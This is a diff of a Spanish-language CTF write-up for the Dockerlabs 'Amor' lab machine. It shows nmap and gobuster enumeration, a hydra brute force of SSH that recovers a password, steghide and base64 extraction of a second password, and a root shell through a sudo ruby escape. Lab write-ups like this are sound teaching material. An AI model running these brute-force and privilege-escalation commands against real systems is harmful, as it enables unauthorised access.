@@ -1,122 +1,164 @@
 # Writeup: Amor &mdash; Dockerlabs
-- **Dificultad:** Fácil
-- **Plataforma:** Dockerlabs
-- **IP Objetivo:** 172.17.0.2
-- **Técnicas Clave:** Enumeración web, Fuerza bruta SSH, Esteganografía, Escalada de privilegios
+- ** Dificultad:** Fácil
+- ** Plataforma:** Dockerlabs
+- ** IP Objetivo:** 172.17.0.2
+- ** Técnicas clave:** Enumeración web, Fuerza bruta SSH, Esteganografía, Escalada de Privilegios
 
-___
-### 1. Reconocimiento
-Comenzamos verificando la conectividad con ```ping -a 172.17.0.2``` y realizando un escaneo de puertos con **Nmap**.
-  
-    $ nmap -p- --open -sS -sC -sV 172.17.0.2 -n -Pn
-  ![Nmap Scan](img/nmapScan.png)
-  
-#### Resultado:
-- **Puerto 22/tcp**
-- **Puerto 80/tcp**
+---
+### Reconocimiento
+Comenzamos verificando la conectividad con **ping** y realizando un escaneo de puertos con **Nmap**:
 
-___
-### 2. Enumeración Web
-Al acceder a ```http://172.17.0.2``` vemos un panel de "avisos" de una empres llamada *SecurSEC S.L*.
+        $ ping -c 1 172.17.0.2
+    
+    ![Ping c](img/ping.png)
 
-![Index](img/index.png)
+        $ nmap -sS -p- --min-rate 1000 -n -Pn 172.17.0.2
 
-#### Pistas econtradas en la web:
-- **Contraseña débil detectada**
-- **Despido de un empleado**
-
-Esto nos da dos posibles usuarios para una futura conexión mediante SSH: ```juan``` y ```carlota```.
-
-### Fuzzing de Directorios
-Ejecutamos ```gobuster``` para buscar directorios/rutas ocultas:
-
-    $ gobuster dir -u 172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/common.txt
-  ![Gobuster](img/gobuster.png)
+    ![Nmap Scan](img/nmapScan.png)
 
 #### Resultado:
-- **```/index.html```** &mdash; (**Status:** ```200```)
-- **```/javascript```** &mdash; (**Status:** ```301```)
-- **```/server-status```** &mdash; (**Status:** ```403```)
+- **Puerto 22/tcp:** SSH
+- **Puerto 80/tcp:** HTTP
+
+Realizamos un escaneo más profundo para identificar versiones y servicios:
+
+        $ nmam -sCV -p22,80 172.17.0.2
+    ![Nmap Scan](img/nmapScan_vs.png)
+
+---
+### Enumeración Web
+Al acceder a ```172.17.0.2``` vemos un panel de "avisos" de una empresa llamada *SecurSEC S.L*.
+
+![Index](img/index.html)
+
+#### Pistas encontradas en la web:
+1. **Conttraseña débil detectada:** "Se ha identificado una contraseña débil en una cuenta de usuario. Por favor, cambie la contraseña por una más segura que incluya caracteres especiales y números."
+2. **Despido de empleado:** "*Juan fue despedido de la empresa por enviar un correo con la contraseña a un compañero."* Firmado: **Carlota**, Departamento de ciberseguridad.
+
+Esto nos da un posible usuario para una conexión SSH a futuro: ```carlota``` (se omite a ```juan``` por obvias razones, está despedido).
+
+#### Fuzzing de directorios
+Ejecutamos ```gobuster``` para buscar rutas ocultas:
+
+        $ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+    ![Gobuster](img/gobuster)
+
+#### Resultado:
+- **```/index.html```**     (**Status:** 200) [**Size:** 3033]
+- **```/javascript```**     (**Status:** 301) [**Size:** 313] [```--> http://172.17.0.2/javascript/```]
+- **```/server-status```**  (**Status:** 403) [**Size:** 275]
 
 Profundizamos en ```/javascript```:
 
-    $ gobuster -u 172.17.0.2/javascript -w /usr/share/seclists/Discovery/Web-Content/common.txt
+        $ gobuster dir -u http://172.17.0.2/javascript/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+    
+    ![Gobuster javascript](img/gobuster_js.png)
 
 #### Resultado:
-- **```/jquery```** (301) &mdash; Directorio sin contenido relevante.
+- **```/jquery```** &mdash; Directorio sin contenido relevante.
 
-___
-### 3. Acceso Inicial (Fuerza Bruta)
-Con los usuarios obtenidos de la web, lanzamos un ataque de fuerza bruta contra SSH con ```hydra```. Solo se intentó con el usuario ```carlota``` por obvias razones (juan habia sido despedido).
+---
+### Acceso Inicial (Fuerza Bruta SSH)
+Con el usuario obtenido de la web, lanzamos un ataque de fuerza bruta contra SSH mediante **Hydra**:
 
-    $ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 16 -f -V -I
-  ![BruteForce](img/hydraBF.png)
-  
-#### Resultado:
+        $ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
+    
+    ![Hydra BruteForce](img/hydraBF.png)
+
+#### Resultado: Credenciales obtenidas.
 - **Usuario:** ```carlota```
 - **Contraseña:** ```babygirl```
 
-Accedemos por SSH:
+Accedemos por **SSH**:
 
-    $ ssh carlota@172.17.0.2
+        $ ssh carlota@172.17.0.2
 
-### 4. Enumeración Post-Explotación
+    ![Acceso Inicial](img/accesoSSH_Carlota.png)
+
+---
+### Enumeración Post-Explotación
 Dentro de la máquina, revisamos los permisos y buscamos vectores de escalada.
 
-    id
-    sudo -l
-    find / -perm 4000 2>/dev/null
-  
-  ![SSH Access](img/sshAccess.png)
+        $ id && whoami
+        $ sudo -l
+        $ find / -perm 4000 2>/dev/null
+
+     ![SudoL](img/sudoL.png)
 
 #### Resultado:
-- ```carlota``` no tiene permisos ```sudo```
-- No hay binarios SUID explotables
+- ```carlota``` no tiene permisos ```sudo```.
+- No hay permisos **SUID** explotables.
 
-Se listó el directorio ```/home/carlota/``` con el fin de encontrar archivos sospechosos:
+Se procede a buscar archivos sospechosos en el directorio ```/home/``` de ```carlota```:
 
-    $ ls -laR /home/carlota/
+        $ ls -laR /home/carlota/
+    
+    ![LS](img/ls.png)
 
-Dentro del ```.bashrc``` se encontró un mensaje "oculto":
+### Revisión del ```.bashrc```
+Encontramos un mensaje oculto en el archivo ```.bashrc``` de ```carlota```
 
-![HidenMsg](img/bashrc.png)
+- **Mensaje:**
+        
+        export SECRET="Hola oscar, recuerdas las  \"vacaciones\" que pasamos juntos? En el interior de nuestro amor hay un secreto. ¿Entiendes?"
 
-Esto nos dió varias pistas:
-- **Posible usuario:** ```oscar```
+    ![Mensaje Oculto](img/bashrc_msg.png)
+
+#### Esto nos da varias pistas:
+- **Usuario Objetivo:** ```oscar```
 - **Palabra clave:** ```vacaciones```
-- **Concepto:** "interior de nuestro amor"
+- **Concepto:** *"interior de nuestro amor"*
 
-### 5. Esteganografía
-Conectado las pistas obtenidas en el ```.bashrc``` y el contenido al listar la ruta ```/home/``` de ```carlota```, dimos con el archivo ```imagen.jpg``` en la ruta ```/home/carlota/Desktop/fotos/vacaciones/```.
+---
+### Esteganografía
+Aprovechamos el listado del directorio ```/home/``` que hicimos previamente y siguiendo las pistas obtenidas nos vamos directamente al  directorio ```/home/carlota/Desktop/fotos/vacaciones```.
 
-1.  Extrajimos el archivo con ```steghide``` (no requirio contraseña) y obtuvimos un archivo de texto (```secret.txt```):
-2.  Al leerlo con ```cat``` obtuvimos un string codificado en **base64**:
-3.  Decodificamos el contenido del archivo con ```base64 -d```
 
-  ![Secret.txt](img/base64.png)
+Extraemos el archivo ```imagen.jpg```  con ```steghide```. No se requirió contraseña (solo presionar Enter).
 
-#### Resultados:
-- **eslacasadepinypon** &mdash; (como posible contraseña de ```oscar```).
+![Steghide](img/steghide.png)
 
-___
-### 6. Escalada de Privilegios
-Cambiamos al usuario ```oscar```:
+Se extrajo un archivo de texto llamado ```secret.txt```. Lo leemos con ```cat secret.txt``` y el contenido es un string en **Base64**:
 
-    $ su oscar
+        ZXNsYWNhc2FkZXBpbnlwb24=
 
-Verificamos los permisos de ```sudo```:
+Decodificamos:
 
-    $ sudo -l
+![Base64 d](img/base64_decode.png)
 
-Resultado:
+Resultado: *eslacasadepinypon* (posible contraseña de usuario).
 
-![Flag00](img/flag00.png)
+---
+### Escalada de Privilegios
+Cambiamos al usuario ```oscar``` desde la shell de ```carlota```:
 
-```oscar``` puede ejecutar ```ruby``` como ```root``` sin contraseña. Aprovechamos esto para obtener una shell con privilegios máximos.
+        $ su oscar
 
-    $ sudo ruby -e 'exec "/bin/bash"'
+    ![Oscar SSH](img/suOscar.png)
+
+Verficamos permisos de ```sudo```:
+
+        $ sudo -l
+
+    ![SUID](img/suid.png)
+
+#### Resultado:
+
+        User oscar may run the following commands on a20ea320150a:
+            (ALL) NOPASSWD: /usr/bin/ruby
+
+```oscar``` puede ejecutar **ruby** como ```root``` sin contraseña. Aprovechamos esto para obtener una shell con privilegios máximos.
+
+        $ sudo ruby -e 'exec "/bin/bash"'
 
 Confirmamos que somos ```root``` y damos por terminada la máquina:
 
-    id && whoami
-  ![Cap Pendiente porque olvide tomarla en el momento](img/flag01.png)
+        $ whoami && id
+
+    ![Flag](img/flag.png)
+
+#### Resultado:
+
+        root
+        uid=0(root) gid=0(root) groups=0(root)
